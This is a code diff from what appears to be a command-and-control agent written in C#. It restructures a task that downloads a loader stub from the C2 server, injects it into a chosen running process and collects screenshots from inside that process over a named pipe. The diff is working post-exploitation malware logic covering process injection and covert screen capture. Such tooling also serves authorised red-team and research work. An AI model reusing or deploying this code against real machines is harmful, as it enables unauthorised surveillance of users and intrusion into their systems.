@@ -115,128 +115,132 @@ namespace Tasks
             };
         }
 
-        public override void Kill()
-        {
-            base.Kill();
-        }
 
-        public override ST.Task CreateTasking()
+
+        public override void Start()
         {
-            return new ST.Task(() =>
+            TaskResponse resp;
+            try
             {
-                TaskResponse resp;
-                try
+                ScreenshotInjectParameters parameters = _jsonSerializer.Deserialize<ScreenshotInjectParameters>(_data.Parameters);
+                if (string.IsNullOrEmpty(parameters.LoaderStubId) ||
+                    string.IsNullOrEmpty(parameters.PipeName))
                 {
-                    ScreenshotInjectParameters parameters = _jsonSerializer.Deserialize<ScreenshotInjectParameters>(_data.Parameters);
-                    if (string.IsNullOrEmpty(parameters.LoaderStubId) ||
-                        string.IsNullOrEmpty(parameters.PipeName))
+                    resp = CreateTaskResponse(
+                        $"One or more required arguments was not provided.",
+                        true,
+                        "error");
+                }
+                else
+                {
+                    bool pidRunning = false;
+                    try
                     {
-                        resp = CreateTaskResponse(
-                            $"One or more required arguments was not provided.",
-                            true,
-                            "error");
+                        System.Diagnostics.Process.GetProcessById(parameters.PID);
+                        pidRunning = true;
                     }
-                    else
+                    catch
                     {
-                        bool pidRunning = false;
-                        try
-                        {
-                            System.Diagnostics.Process.GetProcessById(parameters.PID);
-                            pidRunning = true;
-                        }
-                        catch { pidRunning = false; }
-                        if (pidRunning)
-                        {
+                        pidRunning = false;
+                    }
 
-                            if (_agent.GetFileManager().GetFile(_cancellationToken.Token, _data.ID, parameters.LoaderStubId, out byte[] exeAsmPic))
+                    if (pidRunning)
+                    {
+                        if (_agent.GetFileManager().GetFile(_cancellationToken.Token, _data.ID, parameters.LoaderStubId,
+                                out byte[] exeAsmPic))
+                        {
+                            var injector = _agent.GetInjectionManager().CreateInstance(exeAsmPic, parameters.PID);
+                            if (injector.Inject())
                             {
-                                var injector = _agent.GetInjectionManager().CreateInstance(exeAsmPic, parameters.PID);
-                                if (injector.Inject())
+                                _agent.GetTaskManager().AddTaskResponseToQueue(CreateTaskResponse(
+                                    "",
+                                    false,
+                                    "",
+                                    new IMythicMessage[]
+                                    {
+                                        Artifact.ProcessInject(parameters.PID,
+                                            _agent.GetInjectionManager().GetCurrentTechnique().Name)
+                                    }));
+                                int count = 1;
+                                int interval = 0;
+                                if (parameters.Count > 0)
                                 {
-                                    _agent.GetTaskManager().AddTaskResponseToQueue(CreateTaskResponse(
-                                            "",
-                                            false,
-                                            "",
-                                            new IMythicMessage[]
-                                            {
-                                                Artifact.ProcessInject(parameters.PID, _agent.GetInjectionManager().GetCurrentTechnique().Name)
-                                            }));
-                                    int count = 1;
-                                    int interval = 0;
-                                    if (parameters.Count > 0)
+                                    count = parameters.Count;
+                                }
+
+                                if (parameters.Interval >= 0)
+                                {
+                                    interval = parameters.Interval;
+                                }
+
+                                IPCCommandArguments cmdargs = new IPCCommandArguments
+                                {
+                                    ByteData = new byte[0],
+                                    StringData = string.Format("{0} {1}", count, interval)
+                                };
+                                AsyncNamedPipeClient client = new AsyncNamedPipeClient("127.0.0.1", parameters.PipeName);
+                                client.ConnectionEstablished += Client_ConnectionEstablished;
+                                client.MessageReceived += OnAsyncMessageReceived;
+                                client.Disconnect += Client_Disconnect;
+                                if (client.Connect(10000))
+                                {
+                                    IPCChunkedData[] chunks = _serializer.SerializeIPCMessage(cmdargs);
+                                    foreach (IPCChunkedData chunk in chunks)
                                     {
-                                        count = parameters.Count;
+                                        _senderQueue.Enqueue(Encoding.UTF8.GetBytes(_serializer.Serialize(chunk)));
                                     }
-                                    if (parameters.Interval >= 0)
+
+                                    _senderEvent.Set();
+                                    WaitHandle[] waiters = new WaitHandle[]
                                     {
-                                        interval = parameters.Interval;
-                                    }
-                                    IPCCommandArguments cmdargs = new IPCCommandArguments
-                                    {
-                                        ByteData = new byte[0],
-                                        StringData = string.Format("{0} {1}", count, interval)
+                                        _complete,
+                                        _cancellationToken.Token.WaitHandle
                                     };
-                                    AsyncNamedPipeClient client = new AsyncNamedPipeClient("127.0.0.1", parameters.PipeName);
-                                    client.ConnectionEstablished += Client_ConnectionEstablished;
-                                    client.MessageReceived += OnAsyncMessageReceived;
-                                    client.Disconnect += Client_Disconnect;
-                                    if (client.Connect(10000))
+                                    WaitHandle.WaitAny(waiters);
+                                    ST.Task.WaitAll(uploadTasks.ToArray());
+                                    bool bRet = uploadTasks.Where(t => t.Result == false).ToArray().Length == 0;
+                                    if (bRet)
                                     {
-                                        IPCChunkedData[] chunks = _serializer.SerializeIPCMessage(cmdargs);
-                                        foreach (IPCChunkedData chunk in chunks)
-                                        {
-                                            _senderQueue.Enqueue(Encoding.UTF8.GetBytes(_serializer.Serialize(chunk)));
-                                        }
-                                        _senderEvent.Set();
-                                        WaitHandle[] waiters = new WaitHandle[]
-                                        {
-                                            _complete,
-                                            _cancellationToken.Token.WaitHandle
-                                        };
-                                        WaitHandle.WaitAny(waiters);
-                                        ST.Task.WaitAll(uploadTasks.ToArray());
-                                        bool bRet = uploadTasks.Where(t => t.Result == false ).ToArray().Length == 0;
-                                        if (bRet)
-                                        {
-                                            resp = CreateTaskResponse("", true, "completed");
-                                        } else
-                                        {
-                                            resp = CreateTaskResponse("", true, "error");
-                                        }
+                                        resp = CreateTaskResponse("", true, "completed");
                                     }
                                     else
                                     {
-                                        resp = CreateTaskResponse($"Failed to connect to named pipe.", true, "error");
+                                        resp = CreateTaskResponse("", true, "error");
                                     }
                                 }
                                 else
                                 {
-                                    resp = CreateTaskResponse($"Failed to inject into PID {parameters.PID}", true, "error");
+                                    resp = CreateTaskResponse($"Failed to connect to named pipe.", true, "error");
                                 }
                             }
                             else
                             {
-                                resp = CreateTaskResponse(
-                                    $"Failed to download assembly loader stub (with id: {parameters.LoaderStubId})",
-                                    true,
-                                    "error");
+                                resp = CreateTaskResponse($"Failed to inject into PID {parameters.PID}", true, "error");
                             }
                         }
                         else
                         {
                             resp = CreateTaskResponse(
-                                $"Process with ID {parameters.PID} is not running.",
+                                $"Failed to download assembly loader stub (with id: {parameters.LoaderStubId})",
                                 true,
                                 "error");
                         }
                     }
+                    else
+                    {
+                        resp = CreateTaskResponse(
+                            $"Process with ID {parameters.PID} is not running.",
+                            true,
+                            "error");
+                    }
                 }
-                catch (Exception ex)
-                {
-                    resp = CreateTaskResponse($"Unexpected error: {ex.Message}\n\n{ex.StackTrace}", true, "error");
-                }
-                _agent.GetTaskManager().AddTaskResponseToQueue(resp);
-            }, _cancellationToken.Token);
+            }
+            catch (Exception ex)
+            {
+                resp = CreateTaskResponse($"Unexpected error: {ex.Message}\n\n{ex.StackTrace}", true, "error");
+            }
+
+            _agent.GetTaskManager().AddTaskResponseToQueue(resp);
         }
 
         private void Client_Disconnect(object sender, NamedPipeMessageArgs e)
